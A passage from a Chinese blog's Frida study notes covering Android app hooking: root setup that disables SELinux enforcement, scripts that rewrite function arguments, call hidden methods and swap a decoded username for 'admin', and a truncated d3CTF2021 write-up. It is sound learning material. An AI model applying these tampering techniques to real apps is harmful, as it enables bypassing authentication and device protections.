<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.3.0'
} </script><meta name="generator" content="Hexo 5.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">23</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">21</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Hexo</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/25/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">frida学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-25</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/frida/">frida</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/android/">android</a></span><div class="content"><p><code>frida</code>是一种动态插桩工具，可以插入一些代码到原生<code>app</code>的内存空间去，（动态地监视和修改其行为）</p>
<p>入门学习资料</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Dev0ke/AndroidSecurityStudy/blob/master/FRIDA/A02/README.md">https://github.com/Dev0ke/AndroidSecurityStudy/blob/master/FRIDA/A02/README.md</a></p>
<h1 id="frida的安装"><a href="#frida的安装" class="headerlink" title="frida的安装"></a>frida的安装</h1><p>frida的安装</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c349471bdef7">https://www.jianshu.com/p/c349471bdef7</a></p>
<p>打开方式</p>
<p>cmd命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure>
<p>shell命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">echo 0 &gt; &#x2F;sys&#x2F;fs&#x2F;selinux&#x2F;enforce</span><br><span class="line">&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server64</span><br></pre></td></tr></table></figure>
<p>验证是否开启frida server成功,，另起一cmd：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure>
<h1 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h1><h2 id="js修改函数参数"><a href="#js修改函数参数" class="headerlink" title="js修改函数参数"></a>js修改函数参数</h2><p>自己写一个app</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写一段js代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">console.log(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line">Java.perform(<span class="function">function <span class="title">x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    console.log(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> my_class = Java.use(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>);</span><br><span class="line">    console.log(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    my_class.fun.implementation = function(x,y)&#123;</span><br><span class="line">        console.log( <span class="string">&quot;original call: fun(&quot;</span>+ x + <span class="string">&quot;, &quot;</span> + y + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 启动`demo02`这个app</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.example.myapplication&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment"># 加载s1.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;s1.js&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    x = f.read()</span><br><span class="line">    print(x)</span><br><span class="line">    script = session.create_script(x.decode())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line">kk = <span class="built_in">input</span>(<span class="string">&quot;pause....&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="js处理重载函数"><a href="#js处理重载函数" class="headerlink" title="js处理重载函数"></a>js处理重载函数</h2><p>js代码中的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_class.fun.implementation &#x3D; function(x,y)</span><br></pre></td></tr></table></figure>
<p>变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_class.fun.overload(&quot;int&quot; , &quot;int&quot;).implementation &#x3D; function(x,y)&#123;</span><br><span class="line">...</span><br><span class="line">my_class.fun.overload(&quot;java.lang.String&quot;).implementation &#x3D; function(x)&#123;</span><br></pre></td></tr></table></figure>
<h2 id="js调用函数"><a href="#js调用函数" class="headerlink" title="js调用函数"></a>js调用函数</h2><p>frida调用隐藏函数：通过类的实例的回调函数，调用secret函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.choose(<span class="string">&quot;com.roysue.demo02.MainActivity&quot;</span> , &#123;</span><br><span class="line">  onMatch : function(instance)&#123; <span class="comment">//该类有多少个实例，该回调就会被触发多少次</span></span><br><span class="line">    console.log(<span class="string">&quot;Found instance: &quot;</span>+instance);</span><br><span class="line">    console.log(<span class="string">&quot;Result of secret func: &quot;</span> + instance.secret());</span><br><span class="line">  &#125;,</span><br><span class="line">  onComplete:function()&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="python调用函数"><a href="#python调用函数" class="headerlink" title="python调用函数"></a>python调用函数</h2><p>实现在Python中直接调用安卓<code>app</code>内部的函数</p>
<p>js</p>
<p>rpc.exports 定义js的导出函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callSecretFun</span>(<span class="params"></span>) </span>&#123; <span class="comment">//定义导出函数</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//找到隐藏函数并且调用</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.roysue.demo02.MainActivity&quot;</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Found instance: &quot;</span> + instance);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Result of secret func: &quot;</span> + instance.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    callsecretfunction: callSecretFun <span class="comment">//把callSecretFun函数导出为callsecretfunction符号，导出名不可以有大写字母或者下划线</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>python</p>
<p>script.on注册消息处理函数</p>
<p>script.exports.callsecretfunction() 调用js导出的函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message, payload</span>):</span></span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.roysue.demo02&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;s3.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">    command = raw_input(<span class="string">&quot;Enter command:\n1: Exit\n2: Call secret function\nchoice:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> command == <span class="string">&quot;2&quot;</span>: <span class="comment">#在这里调用</span></span><br><span class="line">        script.exports.callsecretfunction()</span><br></pre></td></tr></table></figure>
<h2 id="python修改函数参数"><a href="#python修改函数参数" class="headerlink" title="python修改函数参数"></a>python修改函数参数</h2><p>js代码</p>
<p>send函数将数据发送给主机的python代码</p>
<p>recv().wait() 阻塞 js 直到收到 python 传来的数据</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tv_class = Java.use(<span class="string">&quot;android.widget.TextView&quot;</span>);</span><br><span class="line">    tv_class.setText.overload(<span class="string">&quot;java.lang.CharSequence&quot;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send = x.toString();</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        send(string_to_send); <span class="comment">// 将数据发送给主机的python代码</span></span><br><span class="line">        recv(<span class="function"><span class="keyword">function</span> (<span class="params">received_json_object</span>) </span>&#123;</span><br><span class="line">            string_to_recv = received_json_object.my_data</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;string_to_recv: &quot;</span> + string_to_recv);</span><br><span class="line">        &#125;).wait(); <span class="comment">//收到数据之后，再执行下去</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.setText(string_to_recv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>python代码</p>
<p>script.on注册消息处理函数，消息处理函数参数接受js发来的数据</p>
<p>script.post 发送JSON对象给 js代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message, payload</span>):</span></span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        data = message[<span class="string">&quot;payload&quot;</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;message:&#x27;</span>, message</span><br><span class="line">        data = data.decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        user, pw = data.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        data = (<span class="string">&quot;admin&quot;</span> + <span class="string">&quot;:&quot;</span> + pw).encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;encoded data:&quot;</span>, data</span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: data&#125;)  <span class="comment"># 将JSON对象发送回去</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Modified data sent&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.roysue.demo04&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;s4.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)  <span class="comment"># 注册消息处理函数</span></span><br><span class="line">script.load()</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure>
<h1 id="dump蓝牙接口和实例"><a href="#dump蓝牙接口和实例" class="headerlink" title="dump蓝牙接口和实例"></a>dump蓝牙接口和实例</h1><p>枚举所有类</p>
<p>Java.enumerateLoadedClasses枚举所有类，onMatch 表示每个匹配的项，onComplete 表示这个函数执行完</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] enumerating classes...&quot;</span>);</span><br><span class="line">    Java.enumerateLoadedClasses(&#123;</span><br><span class="line">      onMatch: <span class="function"><span class="keyword">function</span>(<span class="params">_className</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] found instance of &#x27;&quot;</span>+_className+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>效果如图</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210918164846.png"></p>
<p>格式是xxx.xxx.xxx.xxx</p>
<p>我们过滤一下，只要蓝牙信息</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.enumerateLoadedClasses(&#123;</span><br><span class="line">    onMatch: <span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (instance.split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] == <span class="string">&quot;bluetooth&quot;</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[-&gt;]\t&quot;</span>+instance);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>依旧很多，我们选定一个特定的类</p>
<p>bluetoothDeviceInfo获取蓝牙设备详细信息</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.choose(<span class="string">&quot;android.bluetooth.BluetoothDevice&quot;</span>,&#123;</span><br><span class="line">  onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] &quot;</span>+<span class="string">&quot; android.bluetooth.BluetoothDevice instance found&quot;</span>+<span class="string">&quot; :=&gt; &#x27;&quot;</span>+instance+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    bluetoothDeviceInfo(instance);</span><br><span class="line">  &#125;,</span><br><span class="line">  onComplete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&quot;[*] -----&quot;</span>);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>直接命令行调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l .\s1.js com.android.bluetooth</span><br></pre></td></tr></table></figure>
<p>enumMethods 枚举方法</p>
<h1 id="frida应用于CTF"><a href="#frida应用于CTF" class="headerlink" title="frida应用于CTF"></a>frida应用于CTF</h1><h2 id="d3CTF2021-no-name"><a href="#d3CTF2021-no-name" class="headerlink" title="d3CTF2021-no name"></a>d3CTF2021-no name</h2><p>JEB 打开文件</p>
<p>分析MainActivity，把 input 放入函数checkFlag中，结果checkFlag是空的，也没有导入第三方库</p>
<p>类NoNameApp很可疑，还进行了 AES 操作，一看，原来它把 checkFlag 函数改了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.d3ctf.noname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoNameApp</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">byte</span>[] getAESKey() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Application</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream ins = <span class="keyword">this</span>.getAssets().open(<span class="string">&quot;data.enc&quot;</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[ins.available()];</span><br><span class="line">            ins.read(buf);</span><br><span class="line">            Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5PADDING&quot;</span>);</span><br><span class="line">            cipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.getAESKey(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">byte</span>[] v1_1 = cipher.doFinal(buf);</span><br><span class="line">            String jarPath = <span class="keyword">this</span>.getApplicationInfo().dataDir + <span class="string">&quot;/data.jar&quot;</span>;  <span class="comment">// AES解密生成出来的是一个jar文件</span></span><br><span class="line">            File file = <span class="keyword">new</span> File(jarPath);</span><br><span class="line">            file.createNewFile();</span><br><span class="line">            